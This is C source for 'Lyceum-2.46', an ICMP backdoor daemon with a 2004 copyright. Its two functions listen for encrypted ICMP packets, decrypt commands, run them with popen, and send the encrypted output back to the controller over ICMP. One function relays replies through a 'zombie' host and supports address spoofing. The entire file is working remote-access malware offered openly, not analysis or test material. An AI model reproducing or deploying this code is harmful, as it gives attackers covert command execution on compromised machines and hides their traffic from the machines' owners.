
/* 
 * Lyceum-2.46
 *
 * Copyright (c) 2004 phish <phish@hush.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in
 *    the
 *    documentation and/or other materials provided with the
 *    distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS
 * IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
 * TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
 * PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS
 * BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */




#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include "icmp_bd.h"
#include "lib_icmp.h"
#include "key.h"

unsigned long realip;

int
icmp_backdoord (char *subnet_spoof, int icmp_type)
{

  char emsg[BUFSIZ + MAXMESG];
  char inbuf[128];
  char sbuf[4069];
  char *muf = NULL;
  char *chtmp = NULL;
  FILE *stream;

  char *msg = NULL;

  if ((msg = (char *) malloc (BUFSIZ + MAXMESG)) == NULL)
    {
      perror ("malloc()");
      exit (1);
    }

  ICMP_init ();

  while (1)
    {
      /* Main loop */
    top:;

      bzero (emsg, BUFSIZ + MAXMESG);
      bzero (sbuf, 4069);
      msg = NULL;

      if ((ICMP_recv (emsg, MAXMESG, 0, icmp_type)) == -666)
	goto top;

      muf = decrypt_string (KEY, emsg);

      if ((strncmp (strtok (muf, ":"), "1", 1)) == 0)
	goto top;

      if ((realip = atol (strtok (NULL, ":"))) == 0)
	goto top;

      if ((msg = strtok (NULL, ":")) == NULL)	// meaningless
	goto top;

      if ((msg = strtok (NULL, ":")) == NULL)
	goto top;

      /* change directory */

      if ((strncmp (msg, CLOSE, strlen (CLOSE))) == 0)
	exit (0);

      if ((strncmp (msg, CD, strlen (CD))) == 0)
	{
	  chtmp = strtok (msg, " ");
	  chtmp = strtok (NULL, " ");
	  chdir (strtok (chtmp, "\n"));

	  snprintf (sbuf, sizeof (sbuf), "Changed to %s\n", chtmp);

	  if ((ICMP_send
	       (encrypt_string (KEY, (sbuf)), 0, realip,
		1, 0, subnet_spoof, 0, icmp_type)) == -1)
	    {
	      perror ("sendto()");
	      exit (1);
	    }
	}

      /* end of cd */
      /* Bash command */
      else
	{
	  if (strlen (msg) > 1)
	    {
	      if ((stream = popen (msg, "r")) != NULL)
		{
		  bzero (sbuf, sizeof (sbuf));

		  while ((fgets (inbuf, sizeof (inbuf), stream)) != NULL)
		    {
		      strcat (sbuf, inbuf);
		      bzero (inbuf, 128);
		    }

		  pclose (stream);

		  if ((ICMP_send
		       (encrypt_string (KEY, sbuf), 0,
			realip, 1, 0, subnet_spoof, 0, icmp_type)) != -1);
		}

	    }			/* End of strlen */
	}			/* End of else */
    }				/* End of while */

  ICMP_reset ();
  return 0;
}

int
icmp_bounce_backdoord (void)
{

  char emsg[BUFSIZ + MAXMESG];
  char inbuf[128];
  char sbuf[4069];
  char *muf = NULL;
  char *chtmp = NULL;
  FILE *stream;

  char *msg = NULL;
  unsigned long zombie_host = -1;

  if ((msg = (char *) malloc (BUFSIZ + MAXMESG)) == NULL)
    {
      perror ("malloc()");
      exit (1);
    }

  ICMP_init ();

  while (1)
    {
      /* Main loop */
    top:;

      bzero (emsg, BUFSIZ + MAXMESG);
      bzero (sbuf, 4069);
      msg = NULL;

      if ((zombie_host =
	   ICMP_recv (emsg, MAXMESG, 0, ICMP_ECHOREPLY)) == -666)
	{
	  perror ("Icmp_recv()");
	  exit (1);
	}

      muf = decrypt_string (KEY, emsg);

      if ((strncmp (strtok (muf, ":"), "1", 1)) == 0)
	goto top;

      realip = atol (strtok (NULL, ":"));
      zombie_host = atol (strtok (NULL, ":"));
      msg = strtok (NULL, ":");


      /* change directory */

      if ((strncmp (msg, CLOSE, strlen (CLOSE))) == 0)
	exit (0);

      if ((strncmp (msg, CD, strlen (CD))) == 0)
	{
	  chtmp = strtok (msg, " ");
	  chtmp = strtok (NULL, " ");
	  chdir (strtok (chtmp, "\n"));

	  snprintf (sbuf, sizeof (sbuf), "Changed to %s\n", chtmp);

	  if ((ICMP_send
	       (encrypt_string (KEY, (sbuf)), 0, zombie_host,
		1, 0, NULL, realip, ICMP_ECHO)) == -1)
	    {
	      perror ("sendto()");
	      exit (1);
	    }
	}

      /* end of cd */
      /* Bash command */
      else
	{
	  if (strlen (msg) > 1)
	    {
	      if ((stream = popen (msg, "r")) != NULL)
		{
		  bzero (sbuf, sizeof (sbuf));

		  while ((fgets (inbuf, sizeof (inbuf), stream)) != NULL)
		    {
		      strcat (sbuf, inbuf);
		      bzero (inbuf, 128);
		    }

		  pclose (stream);

		  if ((ICMP_send
		       (encrypt_string (KEY, sbuf), 0,
			zombie_host, 1, 0, NULL, realip, ICMP_ECHO)) != -1);
		}

	    }			/* End of strlen */
	}			/* End of else */
    }				/* End of while */

  ICMP_reset ();
  return 0;
}
